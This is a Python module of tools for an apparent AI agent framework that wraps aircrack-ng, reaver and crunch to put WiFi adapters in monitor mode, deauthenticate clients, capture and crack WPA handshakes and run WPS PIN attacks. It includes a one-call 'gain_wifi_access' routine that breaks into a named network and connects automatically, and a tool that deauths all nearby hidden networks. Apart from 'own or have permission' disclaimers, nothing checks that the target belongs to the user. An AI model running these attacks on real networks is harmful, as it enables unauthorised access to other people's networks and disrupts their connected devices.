"""WiFi security testing tools. Use only on networks you own or have explicit permission to test."""
from __future__ import annotations

import logging
import os
import re
import subprocess
import time
from pathlib import Path

from core.registry import tool

logger = logging.getLogger(__name__)

_WIRELESS_SUDOERS = "/etc/sudoers.d/plia-wireless"

# rockyou.txt lives in different places depending on the distro and is often
# shipped gzipped (Kali's `wordlists` package). We look in all the usual spots
# and decompress a local .gz into our own cache on first use, so the cracking
# tools work on Ubuntu/Mint/Debian where no `wordlists` package exists.
_ROCKYOU_URL = (
    "https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz"
)
_ROCKYOU_CANDIDATES = (
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou/rockyou.txt",
    "/usr/local/share/wordlists/rockyou.txt",
    "/opt/wordlists/rockyou.txt",
    str(Path.home() / "wordlists" / "rockyou.txt"),
)
_ROCKYOU_GZ_CANDIDATES = ("/usr/share/wordlists/rockyou.txt.gz",)
# Kept for backwards compatibility with anything importing the old constant.
_ROCKYOU = _ROCKYOU_CANDIDATES[0]


def _wordlist_dir() -> Path:
    """Where Plia caches wordlists — follows the configured memory_dir."""
    from core.config import get_config
    return Path(os.path.expanduser(get_config().memory_dir)) / "wordlists"


def _rockyou_cache() -> Path:
    return _wordlist_dir() / "rockyou.txt"


def _rockyou_help() -> str:
    cache = _rockyou_cache()
    return (
        "rockyou.txt not found. Get it once with any of these:\n"
        f"  • Any distro: run the download_rockyou tool (≈51 MB, saved to {cache})\n"
        "  • Kali: sudo apt install wordlists\n"
        f"  • Manual: mkdir -p {cache.parent} && "
        f"curl -fL {_ROCKYOU_URL} | gunzip > {cache}"
    )


def _has_wireless_admin() -> bool:
    from core.config import get_config
    cfg = get_config()
    wireless_tools = (
        "start_monitor_mode", "stop_monitor_mode",
        "capture_handshake", "attack_wps", "scan_wps_networks",
    )
    return (
        Path(_WIRELESS_SUDOERS).exists()
        and any(cfg.tool_permissions.get(t) == "admin" for t in wireless_tools)
    )


def _run(*cmd: str, timeout: int = 30) -> subprocess.CompletedProcess:
    try:
        return subprocess.run(list(cmd), capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(list(cmd), -1, "", f"timed out after {timeout}s")


def _sudo(*cmd: str, timeout: int = 30) -> subprocess.CompletedProcess:
    try:
        return subprocess.run(["sudo"] + list(cmd), capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(["sudo"] + list(cmd), -1, "", f"timed out after {timeout}s")


def _bin_missing(name: str) -> str | None:
    r = subprocess.run(["which", name], capture_output=True)
    return name if r.returncode != 0 else None


@tool(description="Install aircrack-ng suite and wireless testing tools (airmon-ng, airodump-ng, aireplay-ng, reaver, wash, crunch).")
def install_wireless_tools() -> str:
    r = subprocess.run(
        ["sudo", "apt-get", "install", "-y", "aircrack-ng", "reaver", "crunch"],
        capture_output=True, text=True, timeout=120,
    )
    if r.returncode != 0:
        return f"Install failed: {r.stderr.strip()[-500:]}"
    installed = []
    for b in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "reaver", "wash", "crunch"):
        if not _bin_missing(b):
            installed.append(b)
    lines = [f"Installed. Available: {', '.join(installed)}"]
    # The `wordlists` package is Kali-only. Try it, then fall back to a direct
    # download so handshake cracking works on Ubuntu/Mint/Debian too.
    if not _find_rockyou()[0]:
        subprocess.run(
            ["sudo", "apt-get", "install", "-y", "wordlists"],
            capture_output=True, text=True, timeout=120,
        )
        if not _find_rockyou()[0]:
            lines.append(
                "No rockyou.txt found (the 'wordlists' package is Kali-only). "
                "Run download_rockyou to fetch it (~51 MB)."
            )
    return "\n".join(lines)


def _detect_wifi_interface() -> str | None:
    r = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True, timeout=5)
    names = []
    for line in r.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 2:
            names.append(parts[1].rstrip(":"))
    # Prefer managed interface; fall back to base name derived from monitor interface
    for name in names:
        if name.startswith("wl") and not name.endswith("mon"):
            return name
    for name in names:
        if name.startswith("wl") and name.endswith("mon"):
            return name[:-3]  # strip "mon" to get original interface name
    return None


@tool(description="Put a wireless interface into monitor mode for packet capture. Requires Admin permission and Wireless Tools sudoers grant. Leave interface empty to auto-detect.")
def start_monitor_mode(interface: str = "") -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions and run the Wireless Tools grant command."
    miss = _bin_missing("airmon-ng")
    if miss:
        return "airmon-ng not found. Run: install_wireless_tools"
    iface = interface or _detect_wifi_interface()
    if not iface:
        return "No WiFi interface found. Specify interface name explicitly."
    mon = iface + "mon"
    existing = _detect_monitor_interface()
    if existing:
        return f"Already in monitor mode on {existing}"
    # Skip 'airmon-ng check kill' — it would kill NetworkManager and crash this server
    r = _sudo("airmon-ng", "start", iface, timeout=15)
    out = (r.stdout + r.stderr).strip()
    if r.returncode != 0:
        return f"Failed: {out}"
    return f"Monitor mode started on {mon}\n{out}"


def _detect_monitor_interface() -> str | None:
    r = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True, timeout=5)
    for line in r.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 2:
            name = parts[1].rstrip(":")
            if name.endswith("mon"):
                return name
    return None


@tool(description="Stop monitor mode and restore interface to managed mode. Requires Admin permission. Leave interface empty to auto-detect.")
def stop_monitor_mode(interface: str = "") -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    miss = _bin_missing("airmon-ng")
    if miss:
        return "airmon-ng not found. Run: install_wireless_tools"
    iface = interface or _detect_monitor_interface()
    if not iface:
        return "No monitor mode interface found."
    r = _sudo("airmon-ng", "stop", iface, timeout=15)
    out = (r.stdout + r.stderr).strip()
    if r.returncode != 0:
        return f"Failed: {out}"
    _sudo("systemctl", "restart", "NetworkManager", timeout=10)
    return f"Monitor mode stopped on {iface}. Network manager restarted."


@tool(description="Scan WiFi networks using monitor mode interface (airodump-ng). More detailed than nmcli scan. Requires Admin + monitor mode. Leave interface empty to auto-detect monitor interface.")
def monitor_scan_networks(interface: str = "", scan_seconds: int = 15) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    iface = interface or _detect_monitor_interface()
    if not iface:
        return "No monitor mode interface found. Run start_monitor_mode first."
    miss = _bin_missing("airodump-ng")
    if miss:
        return "airodump-ng not found. Run: install_wireless_tools"
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        prefix = os.path.join(tmpdir, "scan")
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "-w", prefix, "--output-format", "csv", iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        try:
            time.sleep(min(scan_seconds, 30))
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
        csv_file = prefix + "-01.csv"
        if not Path(csv_file).exists():
            return "No scan output. Ensure interface is in monitor mode."
        lines = Path(csv_file).read_text(errors="replace").splitlines()
    networks = []
    in_ap_section = False
    for line in lines:
        if line.startswith("BSSID"):
            in_ap_section = True
            continue
        if line.startswith("Station MAC"):
            break
        if not line.strip() or not in_ap_section:
            continue
        # Fields: BSSID, first_seen, last_seen, channel, speed, privacy, cipher, auth, power, beacons, iv, lan_ip, id_len, essid, key
        parts = [p.strip() for p in line.split(",")]
        if len(parts) >= 14:
            bssid, ch, enc, power, essid = parts[0], parts[3], parts[5], parts[8], parts[13]
            networks.append((essid or "<hidden>", bssid, ch, enc, power))
    if not networks:
        return "No networks found in scan window."
    networks.sort(key=lambda n: -int(n[4]) if n[4].lstrip("-").isdigit() else 0)
    w = max(len(n[0]) for n in networks)
    header = f"{'ESSID':<{w}}  BSSID              CH   PWR  ENC"
    rows = [f"{e:<{w}}  {b}  {c:>2}  {pwr:>4}  {enc}" for e, b, c, enc, pwr in networks]
    return "\n".join([header] + rows)


@tool(description="Capture a WPA handshake. Sends deauth frames to force client reconnect. Use only on networks you own or have permission to test. Args: interface (monitor mode), bssid, channel, output_dir (default /tmp)")
def capture_handshake(interface: str, bssid: str, channel: str, output_dir: str = "/tmp") -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface or not bssid or not channel:
        return "interface, bssid, and channel are required."
    for b in ("airodump-ng", "aireplay-ng"):
        if _bin_missing(b):
            return f"{b} not found. Run: install_wireless_tools"
    prefix = os.path.join(output_dir, f"plia_{bssid.replace(':', '')}")
    dump_proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "-w", prefix, interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        time.sleep(5)
        _sudo("aireplay-ng", "-0", "5", "-a", bssid, interface, timeout=20)
        time.sleep(10)
    finally:
        dump_proc.terminate()
        try:
            dump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_proc.kill()
    cap_file = prefix + "-01.cap"
    if Path(cap_file).exists() and Path(cap_file).stat().st_size > 0:
        return f"Capture saved to {cap_file}\nRun crack_handshake_rockyou or crack_handshake_wordlist to test."
    return f"No handshake captured at {cap_file}. Try again — client must reconnect during capture window."


@tool(description="Create a wordlist using crunch for password testing. Args: min_len, max_len (max 12), charset (default lowercase+digits), output_file")
def create_wordlist(min_len: int = 8, max_len: int = 8, charset: str = "abcdefghijklmnopqrstuvwxyz0123456789", output_file: str = "/tmp/plia_wordlist.txt") -> str:
    if min_len < 1 or max_len > 12 or min_len > max_len:
        return "min_len must be ≥1, max_len ≤12, min_len ≤ max_len."
    if _bin_missing("crunch"):
        return "crunch not found. Run: install_wireless_tools"
    r = _run("crunch", str(min_len), str(max_len), charset, "-o", output_file, timeout=120)
    if r.returncode != 0:
        return f"Failed: {r.stderr.strip()}"
    size = Path(output_file).stat().st_size if Path(output_file).exists() else 0
    return f"Wordlist saved to {output_file} ({size // 1024} KB)"


@tool(description="Scan for WPS-enabled networks using wash. Requires monitor mode interface. Args: interface (monitor mode), scan_seconds (default 20)")
def scan_wps_networks(interface: str, scan_seconds: int = 20) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface:
        return "interface required (must be in monitor mode)."
    if _bin_missing("wash"):
        return "wash not found. Run: install_wireless_tools"
    # Bound the scan with `timeout`: wash is stopped after scan_seconds even when it
    # prints nothing, so this always returns instead of blocking forever on readline().
    secs = max(1, min(scan_seconds, 60))
    try:
        proc = subprocess.run(
            ["timeout", str(secs), "sudo", "wash", "-i", interface],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            timeout=secs + 10,
        )
    except subprocess.TimeoutExpired:
        return "WPS scan timed out. Is the interface in monitor mode? Run start_monitor_mode first."
    except Exception as exc:
        return f"WPS scan failed: {exc}"
    lines = (proc.stdout or "").splitlines()
    results = [l for l in lines if l and not l.startswith("BSSID") and not l.startswith("-") and not l.startswith("[")]
    if not results:
        if not interface.endswith("mon") and not interface.startswith("wl"):
            return (
                f"No WPS networks found. '{interface}' does not look like a WiFi monitor "
                "interface — WPS scanning needs a WiFi adapter in monitor mode (run "
                "start_monitor_mode first), not an Ethernet port."
            )
        err = (proc.stderr or "").strip()
        if err:
            return f"No WPS networks found. ({err.splitlines()[-1][:120]})"
        return "No WPS networks found. Ensure the interface is in monitor mode."
    return "\n".join(["BSSID              Ch  dBm  WPS  Lck  ESSID"] + results)


@tool(description="Attack WPS PIN on a target network using reaver. Use only on networks you own or have permission to test. Requires monitor mode. Args: interface, bssid, channel")
def attack_wps(interface: str, bssid: str, channel: str) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface or not bssid or not channel:
        return "interface, bssid, and channel are required."
    if _bin_missing("reaver"):
        return "reaver not found. Run: install_wireless_tools"
    r = subprocess.run(
        ["sudo", "reaver", "-i", interface, "-b", bssid, "-c", channel, "-vv", "-t", "5", "-d", "1"],
        capture_output=True, text=True, timeout=120,
    )
    output = (r.stdout + r.stderr).strip()
    for line in output.splitlines():
        if "WPA PSK" in line or "WPS PIN" in line:
            return line.strip()
    return output[-1000:] if output else "No output from reaver."


def _decompress_rockyou(gz_path: Path) -> Path | None:
    """Decompress a rockyou.txt.gz into the user cache. Returns the .txt path."""
    import gzip
    import shutil

    cache = _rockyou_cache()
    tmp = cache.with_name(cache.name + ".part")
    try:
        cache.parent.mkdir(parents=True, exist_ok=True)
        with gzip.open(gz_path, "rb") as src, open(tmp, "wb") as dst:
            shutil.copyfileobj(src, dst, length=1024 * 1024)
        if tmp.stat().st_size == 0:
            tmp.unlink(missing_ok=True)
            return None
        tmp.replace(cache)
        return cache
    except (OSError, EOFError):
        logger.warning("Could not decompress rockyou wordlist from %s", gz_path, exc_info=True)
        tmp.unlink(missing_ok=True)
        return None


def _find_rockyou() -> tuple[str | None, str | None]:
    """Locate a usable rockyou.txt.

    Returns ``(path, error)``: on success ``path`` is set and ``error`` is None;
    when nothing usable exists ``path`` is None and ``error`` explains how to
    obtain it.
    """
    for candidate in _ROCKYOU_CANDIDATES:
        p = Path(candidate)
        try:
            if p.is_file() and p.stat().st_size > 0:
                return str(p), None
        except OSError:
            continue

    cache = _rockyou_cache()
    if cache.is_file() and cache.stat().st_size > 0:
        return str(cache), None

    for gz_candidate in (*_ROCKYOU_GZ_CANDIDATES, str(cache) + ".gz"):
        gz = Path(gz_candidate)
        if not gz.is_file():
            continue
        decompressed = _decompress_rockyou(gz)
        if decompressed:
            return str(decompressed), None
        return None, f"Found {gz} but could not decompress it — try download_rockyou."
    return None, _rockyou_help()


def _download_file(url: str, dest: Path, timeout: int = 600) -> str | None:
    """Download ``url`` to ``dest`` with curl, wget or urllib. Returns an error."""
    if _bin_missing("curl") is None:
        r = _run("curl", "-fL", "--retry", "2", "--connect-timeout", "15",
                 "-o", str(dest), url, timeout=timeout)
        return None if r.returncode == 0 else (r.stderr or r.stdout).strip()[-300:]
    if _bin_missing("wget") is None:
        r = _run("wget", "-q", "-O", str(dest), url, timeout=timeout)
        return None if r.returncode == 0 else (r.stderr or r.stdout).strip()[-300:]
    try:
        import urllib.request
        urllib.request.urlretrieve(url, dest)
        return None
    except Exception as exc:
        return str(exc)


@tool(description="Download the rockyou.txt wordlist (~51 MB) so the WPA handshake "
      "cracking tools can use it. Use when rockyou.txt is missing, e.g. on "
      "Ubuntu/Mint where no 'wordlists' package exists.")
def download_rockyou() -> str:
    existing, _ = _find_rockyou()
    if existing:
        return f"rockyou.txt is already available at {existing}"
    wordlist_dir = _wordlist_dir()
    try:
        wordlist_dir.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        return f"Could not create {wordlist_dir}: {exc}"

    gz_tmp = wordlist_dir / "rockyou.txt.gz.part"
    error = _download_file(_ROCKYOU_URL, gz_tmp)
    if error:
        gz_tmp.unlink(missing_ok=True)
        return f"Download failed: {error}"
    try:
        out = _decompress_rockyou(gz_tmp)
    finally:
        gz_tmp.unlink(missing_ok=True)
    if not out:
        return "Downloaded file could not be decompressed — it may not be a gzip archive."
    size_mb = out.stat().st_size / 1024 ** 2
    return f"rockyou.txt ready at {out} ({size_mb:.0f} MB)."


@tool(description="Crack a WPA handshake capture file using rockyou.txt. Use only on networks you own or have permission to test. Args: capture_file, bssid")
def crack_handshake_rockyou(capture_file: str, bssid: str) -> str:
    if not capture_file or not bssid:
        return "capture_file and bssid are required."
    if not Path(capture_file).exists():
        return f"File not found: {capture_file}"
    if _bin_missing("aircrack-ng"):
        return "aircrack-ng not found. Run: install_wireless_tools"
    wordlist, error = _find_rockyou()
    if not wordlist:
        return error or _rockyou_help()
    r = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist, timeout=600)
    out = (r.stdout + r.stderr)
    for line in out.splitlines():
        if "KEY FOUND" in line:
            return line.strip()
    return out.strip()[-500:] or "Key not found in rockyou.txt."


@tool(description="Crack a WPA handshake using a custom wordlist file. Use only on networks you own or have permission to test. Args: capture_file, bssid, wordlist_file")
def crack_handshake_wordlist(capture_file: str, bssid: str, wordlist_file: str) -> str:
    if not capture_file or not bssid or not wordlist_file:
        return "capture_file, bssid, and wordlist_file are required."
    for f in (capture_file, wordlist_file):
        if not Path(f).exists():
            return f"File not found: {f}"
    if _bin_missing("aircrack-ng"):
        return "aircrack-ng not found. Run: install_wireless_tools"
    r = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist_file, timeout=600)
    out = (r.stdout + r.stderr)
    for line in out.splitlines():
        if "KEY FOUND" in line:
            return line.strip()
    return out.strip()[-500:] or "Key not found in wordlist."


@tool(description="Crack a WPA handshake without a prepared wordlist by generating candidates on the fly (digits only, 8-10 chars). Use only on networks you own or have permission to test. Args: capture_file, bssid")
def crack_handshake_auto(capture_file: str, bssid: str) -> str:
    if not capture_file or not bssid:
        return "capture_file and bssid are required."
    if not Path(capture_file).exists():
        return f"File not found: {capture_file}"
    for b in ("crunch", "aircrack-ng"):
        if _bin_missing(b):
            return f"{b} not found. Run: install_wireless_tools"
    wordlist = f"/tmp/plia_auto_{bssid.replace(':', '')}.txt"
    gen = _run("crunch", "8", "10", "0123456789", "-o", wordlist, timeout=60)
    if gen.returncode != 0:
        return f"crunch failed: {gen.stderr.strip()}"
    try:
        crack = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist, timeout=600)
        out = (crack.stdout + crack.stderr)
        for line in out.splitlines():
            if "KEY FOUND" in line:
                return line.strip()
        return out.strip()[-500:] or "Key not found with auto-generated wordlist."
    finally:
        try:
            Path(wordlist).unlink()
        except Exception:
            pass


# ── Automatic access recovery (no password) ──────────────────────────────────
# Orchestrates the primitives above so "connect to <ssid>" can recover a key
# on its own when no saved profile exists: WPS first (fast), then handshake
# capture + dictionary/auto cracking. Only networks you own or are authorised
# to test.

_ATTACK_BINS = ("airmon-ng", "airodump-ng", "aireplay-ng", "reaver", "aircrack-ng")


def _dbm(power: str) -> int:
    try:
        return int((power or "").strip())
    except ValueError:
        return -1000


def _parse_airodump_csv(csv_file: Path) -> tuple[list[dict], dict[str, set[str]]]:
    """Parse an airodump-ng CSV into (APs, probes). Probes maps BSSID → probed SSIDs."""
    lines = csv_file.read_text(errors="replace").splitlines()
    networks: list[dict] = []
    probes: dict[str, set[str]] = {}
    section = ""
    for line in lines:
        if line.startswith("BSSID"):
            section = "ap"
            continue
        if line.startswith("Station MAC"):
            section = "station"
            continue
        if not line.strip():
            continue
        parts = [p.strip() for p in line.split(",")]
        if section == "ap" and len(parts) >= 14:
            bssid, ch, enc, power, essid = parts[0], parts[3], parts[5], parts[8], parts[13]
            networks.append({
                "ssid": essid or "",
                "bssid": bssid,
                "channel": ch,
                "enc": enc,
                "power": _dbm(power),
            })
        elif section == "station" and len(parts) >= 7:
            bssid = parts[5]
            probed = parts[6:]  # "Probed ESSIDs" may itself be a comma-separated list
            if bssid:
                probes.setdefault(bssid, set()).update(s.strip() for s in probed if s.strip())
    networks.sort(key=lambda n: -n["power"])
    return networks, probes


def _airodump_run(mon_iface: str, seconds: int,
                  deauth_bssids: list[str] | None = None) -> tuple[list[dict], dict[str, set[str]]]:
    """Run airodump-ng for `seconds`, optionally deauthing BSSIDs after a short settle.
    Returns (APs, probes)."""
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        prefix = os.path.join(tmpdir, "scan")
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "-w", prefix, "--output-format", "csv", mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        try:
            if deauth_bssids:
                time.sleep(5)
                for bssid in deauth_bssids:
                    _sudo("aireplay-ng", "-0", "5", "-a", bssid, mon_iface, timeout=20)
            time.sleep(seconds)
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
        csv_file = prefix + "-01.csv"
        if not Path(csv_file).exists():
            return [], {}
        return _parse_airodump_csv(Path(csv_file))


def _airodump_scan(mon_iface: str, scan_seconds: int = 15) -> list[dict]:
    """Run airodump-ng and return structured AP rows: {ssid, bssid, channel, enc, power}."""
    aps, _ = _airodump_run(mon_iface, scan_seconds)
    return aps


def _find_target_ap(ssid: str, networks: list[dict]) -> dict | None:
    """Best AP match for a user-supplied SSID (exact, then containment by signal)."""
    t = ssid.strip().lower()
    for n in networks:
        if n["ssid"].lower() == t:
            return n
    best: dict | None = None
    for n in networks:
        sl = n["ssid"].lower()
        if sl and (t in sl or sl in t) and (best is None or n["power"] > best["power"]):
            best = n
    return best


def _wps_psk(mon_iface: str, bssid: str, channel: str) -> str | None:
    """Attempt a WPS PIN attack with reaver; return the recovered PSK or None."""
    r = _sudo("reaver", "-i", mon_iface, "-b", bssid, "-c", channel,
              "-vv", "-t", "5", "-d", "1", timeout=120)
    out = r.stdout + r.stderr
    m = re.search(r"WPA PSK\s*[:=]\s*['\"]?([^'\"\s]+)", out)
    return m.group(1) if m else None


def _capture_handshake_file(mon_iface: str, bssid: str, channel: str) -> str | None:
    """Capture a WPA handshake; return the .cap path, or None on failure."""
    prefix = os.path.join("/tmp", f"plia_{bssid.replace(':', '')}")
    dump_proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "-w", prefix, mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        time.sleep(5)
        _sudo("aireplay-ng", "-0", "5", "-a", bssid, mon_iface, timeout=20)
        time.sleep(10)
    finally:
        dump_proc.terminate()
        try:
            dump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_proc.kill()
    cap_file = prefix + "-01.cap"
    if Path(cap_file).exists() and Path(cap_file).stat().st_size > 0:
        return cap_file
    return None


def _aircrack_psk(capture_file: str, bssid: str, wordlist: str) -> str | None:
    """Crack a capture with a wordlist; return the PSK or None."""
    r = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist, timeout=600)
    out = r.stdout + r.stderr
    for line in out.splitlines():
        if "KEY FOUND" in line:
            m = re.search(r"\[(.+?)\]", line)
            return m.group(1).strip() if m else "found"
    return None


def _crack_with_wordlists(capture_file: str, bssid: str) -> str | None:
    """Try rockyou.txt, then an auto-generated digits-only wordlist."""
    wordlist, _ = _find_rockyou()
    if wordlist:
        psk = _aircrack_psk(capture_file, bssid, wordlist)
        if psk:
            return psk
    if _bin_missing("crunch") is None:
        wl = f"/tmp/plia_auto_{bssid.replace(':', '')}.txt"
        gen = _run("crunch", "8", "10", "0123456789", "-o", wl, timeout=60)
        if gen.returncode == 0:
            try:
                return _aircrack_psk(capture_file, bssid, wl)
            finally:
                try:
                    Path(wl).unlink()
                except Exception:
                    pass
    return None


def _stop_monitor(mon_iface: str) -> None:
    """Restore managed mode and NetworkManager after a monitor-mode session."""
    if not mon_iface or _detect_monitor_interface() is None:
        return
    _sudo("airmon-ng", "stop", mon_iface, timeout=15)
    _sudo("systemctl", "restart", "NetworkManager", timeout=10)


@tool(description="Obtain access to a WiFi network when you don't have its password, using WPS first and then a WPA handshake capture + crack. Connects automatically if a key is recovered. Use only on networks you own or have explicit permission to test. Requires Admin + the Wireless Tools grant.")
def gain_wifi_access(ssid: str, interface: str = "") -> str:
    ssid = (ssid or "").strip()
    if not ssid:
        return "ssid is required."
    if not _has_wireless_admin():
        return (
            "Permission denied. Set the Wireless Tools to Admin in Settings → Permissions "
            "and run the grant command shown there, then retry."
        )
    missing = [b for b in _ATTACK_BINS if _bin_missing(b)]
    if missing:
        return f"Missing tools: {', '.join(missing)}. Run install_wireless_tools first."

    iface = interface or _detect_wifi_interface()
    if not iface:
        return "No WiFi interface found. Specify one explicitly."

    mon = _detect_monitor_interface()
    if not mon:
        r = _sudo("airmon-ng", "start", iface, timeout=15)
        if r.returncode != 0:
            return f"Could not start monitor mode on {iface}: {(r.stdout + r.stderr).strip()}"
        mon = _detect_monitor_interface() or iface + "mon"

    recovered: str | None = None
    method = ""
    failure = ""
    try:
        ap = _find_target_ap(ssid, _airodump_scan(mon, 15))
        if ap is None:
            failure = f"Could not find '{ssid}' in range (monitor scan)."
        else:
            bssid, channel = ap["bssid"], ap["channel"]
            recovered = _wps_psk(mon, bssid, channel)
            if recovered:
                method = "WPS"
            else:
                cap = _capture_handshake_file(mon, bssid, channel)
                if cap is None:
                    failure = f"No handshake captured for '{ssid}'. A client must (re)connect during capture."
                else:
                    recovered = _crack_with_wordlists(cap, bssid)
                    if recovered:
                        method = "handshake cracking"
                    else:
                        failure = (
                            f"Handshake captured at {cap} but the key was not in the default "
                            "wordlists. Run crack_handshake_wordlist with a better wordlist."
                        )
    except Exception as exc:
        failure = f"Access recovery failed: {exc}"
    finally:
        _stop_monitor(mon)

    if recovered:
        from modules.network_tools import connect_wifi
        connect_result = connect_wifi(ssid, iface, recovered)
        return f"Recovered the key for '{ssid}' via {method}. {connect_result}"
    return failure or f"Could not obtain access to '{ssid}'."


@tool(description="Reveal the SSID of every nearby hidden WiFi network (networks that don't broadcast their name). Puts the interface in monitor mode, deauths clients so they re-announce the SSID, and reports all revealed names. Use only on networks you own or have permission to test. Requires Admin + the Wireless Tools grant.")
def reveal_hidden_ssid(interface: str = "") -> str:
    if not _has_wireless_admin():
        return (
            "Permission denied. Set the Wireless Tools to Admin in Settings → Permissions "
            "and run the grant command shown there, then retry."
        )
    missing = [b for b in ("airmon-ng", "airodump-ng", "aireplay-ng") if _bin_missing(b)]
    if missing:
        return f"Missing tools: {', '.join(missing)}. Run install_wireless_tools first."

    iface = interface or _detect_wifi_interface()
    if not iface:
        return "No WiFi interface found. Specify one explicitly."

    mon = _detect_monitor_interface()
    if not mon:
        r = _sudo("airmon-ng", "start", iface, timeout=15)
        if r.returncode != 0:
            return f"Could not start monitor mode on {iface}: {(r.stdout + r.stderr).strip()}"
        mon = _detect_monitor_interface() or iface + "mon"

    try:
        # 1. Find APs that broadcast no SSID.
        aps, _ = _airodump_run(mon, 15)
        hidden = [ap for ap in aps if not ap["ssid"]]
        if not hidden:
            return "No hidden networks found — all nearby networks broadcast their SSID."

        # 2. Deauth clients on each hidden AP so they re-announce the SSID on reconnect.
        bssids = [ap["bssid"] for ap in hidden]
        aps2, probes2 = _airodump_run(mon, 20, deauth_bssids=bssids)

        # 3. Map every hidden BSSID to a revealed name.
        lines = [f"Found {len(hidden)} hidden network(s):"]
        for ap in hidden:
            bssid = ap["bssid"]
            name = ""
            for ap2 in aps2:
                if ap2["bssid"] == bssid and ap2["ssid"]:
                    name = ap2["ssid"]
                    break
            if name:
                lines.append(f"{bssid} → {name!r}")
            else:
                candidates = sorted(probes2.get(bssid, set()))
                if candidates:
                    lines.append(f"{bssid} → candidates: {', '.join(repr(c) for c in candidates)}")
                else:
                    lines.append(f"{bssid} → not revealed (no client reconnected to deauth)")
        return "\n".join(lines)
    except Exception as exc:
        return f"Could not reveal hidden SSIDs: {exc}"
    finally:
        _stop_monitor(mon)
